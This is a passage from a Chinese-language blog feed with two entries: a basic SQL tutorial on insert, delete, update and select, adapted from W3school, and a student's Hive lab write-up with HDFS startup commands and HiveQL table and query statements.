            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL增删改查</title>
      <link href="2020/06/21/sql-zeng-shan-gai-cha/"/>
      <url>2020/06/21/sql-zeng-shan-gai-cha/</url>
      
        <content type="html"><![CDATA[<p>内容来自<a href="https://www.w3school.com.cn/sql/index.asp" target="_blank" rel="noopener">W3school</a>，侵删</p><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><h3 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h3><p>INSERT INTO 语句用于向表格中插入新的行。</p><p>基本语法：</p><pre class=" language-lang-sql"><code class="language-lang-sql">INSERT INTO 表名称 VALUES (值1, 值2,....)</code></pre><p>我们也可以指定所要插入数据的列：</p><pre class=" language-lang-sql"><code class="language-lang-sql">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</code></pre><h3 id="插入新的行"><a href="#插入新的行" class="headerlink" title="插入新的行"></a>插入新的行</h3><p>“Persons” 表：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><p>SQL 语句：</p><pre class=" language-lang-sql"><code class="language-lang-sql">INSERT INTO Persons VALUES ('Gates', 'Bill', 'Xuanwumen 10', 'Beijing')</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h3 id="在指定的列中插入数据"><a href="#在指定的列中插入数据" class="headerlink" title="在指定的列中插入数据"></a>在指定的列中插入数据</h3><p>“Persons” 表：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><p>SQL 语句：</p><pre class=" language-lang-sql"><code class="language-lang-sql">INSERT INTO Persons (LastName, Address) VALUES ('Wilson', 'Champs-Elysees')</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Wilson</td><td style="text-align:left"></td><td style="text-align:left">Champs-Elysees</td></tr></tbody></table></div><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><h3 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h3><p>DELETE 语句用于删除表中的行。</p><p>基本语法：</p><pre class=" language-lang-sql"><code class="language-lang-sql">DELETE FROM 表名称 WHERE 列名称 = 值</code></pre><p>Person:</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Wilson</td><td style="text-align:left">Fred</td><td style="text-align:left">Zhongshan 23</td><td style="text-align:left">Nanjing</td></tr></tbody></table></div><h3 id="删除某行"><a href="#删除某行" class="headerlink" title="删除某行"></a>删除某行</h3><p>“Fred Wilson” 会被删除：</p><pre class=" language-lang-sql"><code class="language-lang-sql">DELETE FROM Person WHERE LastName = 'Wilson'</code></pre><p>结果:</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h3 id="删除所有行"><a href="#删除所有行" class="headerlink" title="删除所有行"></a>删除所有行</h3><p>可以在不删除表的情况下删除所有的行。这意味着表的结构、属性和索引都是完整的：</p><pre class=" language-lang-sql"><code class="language-lang-sql">DELETE FROM table_name</code></pre><p>或者：</p><pre class=" language-lang-sql"><code class="language-lang-sql">DELETE * FROM table_name</code></pre><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><h3 id="Update-语句"><a href="#Update-语句" class="headerlink" title="Update 语句"></a>Update 语句</h3><p>Update 语句用于修改表中的数据。</p><p>基本语法：</p><pre class=" language-lang-sql"><code class="language-lang-sql">UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值</code></pre><p>Person:</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Wilson</td><td style="text-align:left"></td><td style="text-align:left">Champs-Elysees</td></tr></tbody></table></div><h3 id="更新某一行中的一个列"><a href="#更新某一行中的一个列" class="headerlink" title="更新某一行中的一个列"></a>更新某一行中的一个列</h3><p>我们为 lastname 是 “Wilson” 的人添加 firstname：</p><pre class=" language-lang-sql"><code class="language-lang-sql">UPDATE Person SET FirstName = 'Fred' WHERE LastName = 'Wilson'</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Wilson</td><td style="text-align:left">Fred</td><td style="text-align:left">Champs-Elysees</td></tr></tbody></table></div><h3 id="更新某一行中的若干列"><a href="#更新某一行中的若干列" class="headerlink" title="更新某一行中的若干列"></a>更新某一行中的若干列</h3><p>我们会修改地址（address），并添加城市名称（city）：</p><pre class=" language-lang-sql"><code class="language-lang-sql">UPDATE Person SET Address = 'Zhongshan 23', City = 'Nanjing'WHERE LastName = 'Wilson'</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Wilson</td><td style="text-align:left">Fred</td><td style="text-align:left">Zhongshan 23</td><td style="text-align:left">Nanjing</td></tr></tbody></table></div><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h3><p>SELECT 语句用于从表中选取数据。</p><p>结果被存储在一个结果表中（称为结果集）。</p><p>SQL SELECT 语法</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT 列名称 FROM 表名称</code></pre><p>以及：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM 表名称</code></pre><p><strong>注释：</strong>SQL 语句对大小写不敏感。SELECT 等效于 select。</p><p>SQL SELECT 实例</p><p>如需获取名为 “LastName” 和 “FirstName” 的列的内容（从名为 “Persons” 的数据库表），请使用类似这样的 SELECT 语句：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT LastName,FirstName FROM Persons</code></pre><p>“Persons” 表:</p><div class="table-container"><table><thead><tr><th style="text-align:left">Id</th><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">Adams</td><td style="text-align:left">John</td><td style="text-align:left">Oxford Street</td><td style="text-align:left">London</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">Bush</td><td style="text-align:left">George</td><td style="text-align:left">Fifth Avenue</td><td style="text-align:left">New York</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th></tr></thead><tbody><tr><td style="text-align:left">Adams</td><td style="text-align:left">John</td></tr><tr><td style="text-align:left">Bush</td><td style="text-align:left">George</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td></tr></tbody></table></div><p>SQL SELECT * 实例</p><p>现在我们希望从 “Persons” 表中选取所有的列。</p><p>请使用符号 * 取代列的名称，就像这样：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM Persons</code></pre><p><strong>提示：</strong>星号（*）是选取所有列的快捷方式。</p><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Id</th><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">Adams</td><td style="text-align:left">John</td><td style="text-align:left">Oxford Street</td><td style="text-align:left">London</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">Bush</td><td style="text-align:left">George</td><td style="text-align:left">Fifth Avenue</td><td style="text-align:left">New York</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h4 id="SELECT-DISTINCT-语句"><a href="#SELECT-DISTINCT-语句" class="headerlink" title="SELECT DISTINCT 语句"></a>SELECT DISTINCT 语句</h4><p>在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。</p><p>关键词 DISTINCT 用于返回唯一不同的值。</p><p>基本语法：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT DISTINCT 列名称 FROM 表名称</code></pre><h4 id="使用-DISTINCT-关键词"><a href="#使用-DISTINCT-关键词" class="headerlink" title="使用 DISTINCT 关键词"></a>使用 DISTINCT 关键词</h4><p>如果要从 “Company” 列中选取所有的值，我们需要使用 SELECT 语句：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT Company FROM Orders</code></pre><p>“Orders”表：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr></tbody></table></div><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th></tr></thead><tbody><tr><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">W3School</td></tr><tr><td style="text-align:left">Apple</td></tr><tr><td style="text-align:left">W3School</td></tr></tbody></table></div><p>请注意，在结果集中，W3School 被列出了两次。</p><p>如需从 Company” 列中仅选取唯一不同的值，我们需要使用 SELECT DISTINCT 语句：</p><pre class=" language-lang-SQL"><code class="language-lang-SQL">SELECT DISTINCT Company FROM Orders</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th></tr></thead><tbody><tr><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">W3School</td></tr><tr><td style="text-align:left">Apple</td></tr></tbody></table></div><p>现在，在结果集中，”W3School” 仅被列出了一次。</p><h3 id="WHERE语句"><a href="#WHERE语句" class="headerlink" title="WHERE语句"></a>WHERE语句</h3><p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句。</p><p>基本语法：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT 列名称 FROM 表名称 WHERE 列 运算符 值</code></pre><p>下面的运算符可在 WHERE 子句中使用：</p><div class="table-container"><table><thead><tr><th style="text-align:left">操作符</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">等于</td></tr><tr><td style="text-align:left">&lt;&gt;</td><td style="text-align:left">不等于</td></tr><tr><td style="text-align:left">&gt;</td><td style="text-align:left">大于</td></tr><tr><td style="text-align:left">&lt;</td><td style="text-align:left">小于</td></tr><tr><td style="text-align:left">&gt;=</td><td style="text-align:left">大于等于</td></tr><tr><td style="text-align:left">&lt;=</td><td style="text-align:left">小于等于</td></tr><tr><td style="text-align:left">BETWEEN</td><td style="text-align:left">在某个范围内</td></tr><tr><td style="text-align:left">LIKE</td><td style="text-align:left">搜索某种模式</td></tr></tbody></table></div><p><strong>注释：</strong>在某些版本的 SQL 中，操作符 &lt;&gt; 可以写为 !=。</p><h4 id="使用-WHERE-子句"><a href="#使用-WHERE-子句" class="headerlink" title="使用 WHERE 子句"></a>使用 WHERE 子句</h4><p>如果只希望选取居住在城市 “Beijing” 中的人，我们需要向 SELECT 语句添加 WHERE 子句：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM Persons WHERE City='Beijing'</code></pre><p>“Persons” 表</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th><th style="text-align:left">Year</th></tr></thead><tbody><tr><td style="text-align:left">Adams</td><td style="text-align:left">John</td><td style="text-align:left">Oxford Street</td><td style="text-align:left">London</td><td style="text-align:left">1970</td></tr><tr><td style="text-align:left">Bush</td><td style="text-align:left">George</td><td style="text-align:left">Fifth Avenue</td><td style="text-align:left">New York</td><td style="text-align:left">1975</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td><td style="text-align:left">1980</td></tr><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td><td style="text-align:left">1985</td></tr></tbody></table></div><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th><th style="text-align:left">Year</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td><td style="text-align:left">1980</td></tr><tr><td style="text-align:left">Gates</td><td style="text-align:left">Bill</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td><td style="text-align:left">1985</td></tr></tbody></table></div><h4 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h4><p>请注意，我们在例子中的条件值周围使用的是单引号。</p><p>SQL 使用单引号来环绕<em>文本值</em>（大部分数据库系统也接受双引号）。如果是<em>数值</em>，请不要使用引号。</p><p>文本值：</p><pre class=" language-lang-sql"><code class="language-lang-sql">这是正确的：SELECT * FROM Persons WHERE FirstName='Bush'这是错误的：SELECT * FROM Persons WHERE FirstName=Bush</code></pre><p>数值：</p><pre class=" language-lang-sql"><code class="language-lang-sql">这是正确的：SELECT * FROM Persons WHERE Year>1965这是错误的：SELECT * FROM Persons WHERE Year>'1965'</code></pre><h3 id="AND-和-OR-运算符"><a href="#AND-和-OR-运算符" class="headerlink" title="AND 和 OR 运算符"></a>AND 和 OR 运算符</h3><p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p><p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p><p>原始的表 (用在例子中的)：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Adams</td><td style="text-align:left">John</td><td style="text-align:left">Oxford Street</td><td style="text-align:left">London</td></tr><tr><td style="text-align:left">Bush</td><td style="text-align:left">George</td><td style="text-align:left">Fifth Avenue</td><td style="text-align:left">New York</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">William</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h4 id="AND-运算符实例"><a href="#AND-运算符实例" class="headerlink" title="AND 运算符实例"></a>AND 运算符实例</h4><p>使用 AND 来显示所有姓为 “Carter” 并且名为 “Thomas” 的人：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM Persons WHERE FirstName='Thomas' AND LastName='Carter'</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h4 id="OR-运算符实例"><a href="#OR-运算符实例" class="headerlink" title="OR 运算符实例"></a>OR 运算符实例</h4><p>使用 OR 来显示所有姓为 “Carter” 或者名为 “Thomas” 的人：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM Persons WHERE firstname='Thomas' OR lastname='Carter'</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">William</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h4 id="结合-AND-和-OR-运算符"><a href="#结合-AND-和-OR-运算符" class="headerlink" title="结合 AND 和 OR 运算符"></a>结合 AND 和 OR 运算符</h4><p>我们也可以把 AND 和 OR 结合起来（使用圆括号来组成复杂的表达式）:</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT * FROM Persons WHERE (FirstName='Thomas' OR FirstName='William')AND LastName='Carter'</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">LastName</th><th style="text-align:left">FirstName</th><th style="text-align:left">Address</th><th style="text-align:left">City</th></tr></thead><tbody><tr><td style="text-align:left">Carter</td><td style="text-align:left">Thomas</td><td style="text-align:left">Changan Street</td><td style="text-align:left">Beijing</td></tr><tr><td style="text-align:left">Carter</td><td style="text-align:left">William</td><td style="text-align:left">Xuanwumen 10</td><td style="text-align:left">Beijing</td></tr></tbody></table></div><h2 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h2><p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p><p>ORDER BY 语句默认按照升序对记录进行排序。</p><p>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。</p><h4 id="原始的表-用在例子中的-："><a href="#原始的表-用在例子中的-：" class="headerlink" title="原始的表 (用在例子中的)："></a>原始的表 (用在例子中的)：</h4><p>Orders 表:</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr></tbody></table></div><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例 1"></a>实例 1</h4><p>以字母顺序显示公司名称：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT Company, OrderNumber FROM Orders ORDER BY Company</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr></tbody></table></div><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例 2"></a>实例 2</h4><p>以字母顺序显示公司名称（Company），并以数字顺序显示顺序号（OrderNumber）：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT Company, OrderNumber FROM Orders ORDER BY Company, OrderNumber</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr></tbody></table></div><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例 3"></a>实例 3</h4><p>以逆字母顺序显示公司名称：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr></tbody></table></div><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例 4"></a>实例 4</h4><p>以逆字母顺序显示公司名称，并以数字顺序显示顺序号：</p><pre class=" language-lang-sql"><code class="language-lang-sql">SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC, OrderNumber ASC</code></pre><p>结果：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Company</th><th style="text-align:left">OrderNumber</th></tr></thead><tbody><tr><td style="text-align:left">W3School</td><td style="text-align:left">2356</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left">6953</td></tr><tr><td style="text-align:left">IBM</td><td style="text-align:left">3532</td></tr><tr><td style="text-align:left">Apple</td><td style="text-align:left">4698</td></tr></tbody></table></div><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.w3school.com.cn/" target="_blank" rel="noopener">W3school</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive实验</title>
      <link href="2020/06/19/hive-shi-yan/"/>
      <url>2020/06/19/hive-shi-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该文为Hadoop基础实验中的hive实验</p><h2 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h2><p>掌握hive的编程技术</p><h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><p>1、创建数据库stu。</p><p>2、创建students表，表结构如下：</p><p>id         int,</p><p>name       string,</p><p>gender      string,</p><p>age         int,</p><p>course_id    int,</p><p>score      double,</p><p>classes      string</p><p>3、导入数据students_data.txt到students表。</p><p>4、创建course表，表结构如下：</p><p>course_id       int,</p><p>course_name    string</p><p>5、导入数据course.txt到course表。</p><p>6、创建动态分区表students_dynamic，以classes为分区字段。</p><p>7、从students表导入数据到students_dynamic。</p><p>8、查询每个班的平均分数。</p><p>9、查询students表中所有学生的姓名、分数。</p><p>10、查询students表中成绩在80至90之间的记录的所有信息。</p><p>11、查询students表中成绩在60以下的记录的姓名、课程编号（course_id）和分数。</p><p>12、将students表中的所有记录先按分数降序，当分数一样时，再按姓名升序排列。</p><p>13、统计students表中有多少门不同的课程。</p><p>14、查询Mary所选修课程的课程编号和分数。</p><p>15、找出所有学生中，course_id为30的课程，分数最高的同学。输出该同学姓名、分数、课程名称、所在班级到屏幕。</p><h2 id="实验方案"><a href="#实验方案" class="headerlink" title="实验方案"></a>实验方案</h2><p>打开hive( 在hadoop根目录执行)</p><pre class=" language-lang-shell"><code class="language-lang-shell">start-dfs.sh</code></pre><p>该语句为打开hdfs分布式文件系统，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image002.jpg" alt="img"></p><p>start-yarn.sh</p><p>该语句为打开资源调度框架yarn，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image004.png" alt="img"></p><pre class=" language-lang-shell"><code class="language-lang-shell">service mysqld start</code></pre><p>该语句为打开mysql数据库，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image006.jpg" alt="img"></p><pre class=" language-lang-shell"><code class="language-lang-shell">hive</code></pre><p>该语句为打开hive，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image008.jpg" alt="img"></p><p>由于hive是部署在hdfs上的组件，故打开hive之前要打开hdfs和yarn框架来调度资源，而hive产生的元数据存储在mysql中，故打开hdfs和yarn之后，且在打开hive之前要打开mysql。</p><p>1.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> create database stu;</code></pre><p>该语句为创建名为stu的数据库，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image010.jpg" alt="img"></p><p>2.</p><pre class=" language-lang-shell"><code class="language-lang-shell"> use stu;</code></pre><p>该语句为使用数据库stu，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image012.jpg" alt="img"></p><pre class=" language-lang-sql"><code class="language-lang-sql">create table students(id int,name string,gender string,age int,course_id int,score double,classes string) row format delimited fields terminated by ',';</code></pre><p>创建名为students的表格，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image014.png" alt="img"></p><p>3.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> load data local inpath '/simple/data/students_data.txt' overwrite into table students;</code></pre><p>从本地加载数据到表students中，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image016.jpg" alt="img"></p><p>4.</p><pre class=" language-lang-sql"><code class="language-lang-sql">hive> create table course(course_id int,course_name string) row format delimited fields terminated by ',';</code></pre><p>创建名为course的表，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image018.jpg" alt="img"></p><p>5.</p><pre class=" language-lang-sql"><code class="language-lang-sql">load data local inpath '/simple/data/course.txt' overwrite into table course;</code></pre><p>从本地加载数据到表course中，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image020.jpg" alt="img"></p><p>6.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> set hive.exec.dynamic.partition=true; set hive.exec.dynamic.partition.mode=nostrict;</code></pre><p>创建动态分区表之前要先开启分区，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image022.jpg" alt="img"></p><pre class=" language-lang-sql"><code class="language-lang-sql"> create table students_dynamic(id int,name string,gender string,age int,course_id int,score double,classes string) partitioned by(class string) row format delimited fields terminated by ',';</code></pre><p>创建动态分区表，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image024.jpg" alt="img"></p><p>7．</p><pre class=" language-lang-sql"><code class="language-lang-sql"> insert overwrite table students_dynamic partition(class='classA')select * from students;</code></pre><p>在数据库stu中动态分区表students_dynamic中插入表students的数据，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image026.jpg" alt="img"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image028.jpg" alt="img"></p><p>8.</p><pre class=" language-lang-sql"><code class="language-lang-sql"> select classes,avg(score) from students group by classes;</code></pre><p>查询每个班的平均分数，运行结果如下：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/clip_image030.jpg" alt="img"></p><p><img 